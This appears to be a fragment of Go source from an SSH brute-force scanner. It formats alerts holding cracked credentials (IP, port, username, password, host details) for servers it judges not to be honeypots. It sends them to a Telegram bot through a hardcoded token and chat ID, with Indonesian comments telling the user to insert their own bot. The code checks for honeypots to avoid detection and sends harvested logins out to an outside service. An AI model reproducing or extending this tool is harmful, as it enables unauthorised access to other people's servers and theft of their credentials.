	...
	if err == nil {
		...
		if !serverInfo.IsHoneypot {
			...
			msg := fmt.Sprintf("=== 🎯 <b>SSH Success</b> 🎯 ===\n"+
				...
				"⚡ <b>Response Time:</b> %v\n"+
				"🔌 <b>Open Ports:</b> %v\n"+
				"🍯 <b>Honeypot Score:</b> %d\n"+
				"🕒 <b>Timestamp:</b> %s\n"+
				"========================", 
				serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, 
				serverInfo.Hostname, serverInfo.OSInfo, serverInfo.SSHVersion,
				serverInfo.ResponseTime, serverInfo.OpenPorts, serverInfo.HoneypotScore,
				time.Now().Format("2006-01-02 15:04:05"))
			...
			// FORMAT HONEYPOT
			msg := fmt.Sprintf("🍯 <b>HONEYPOT DETECTED</b>\n"+
				"━━━━━━━━━━━━━━\n"+
				"📝 <code>HONEYPOT: %s:%s@%s:%s (Score: %d)</code>\n"+
				"━━━━━━━━━━━━━━", 
				serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, 
				serverInfo.HoneypotScore)
...
func SendTelegramNotification(message string) {
	const token = "8489649514:AAGboIiburC9PSB389XqMJBNRYVnUbSmNiE" // Ganti pake token bot lu
	const chatID = "8210180704"   // Ganti pake ID telegram lu
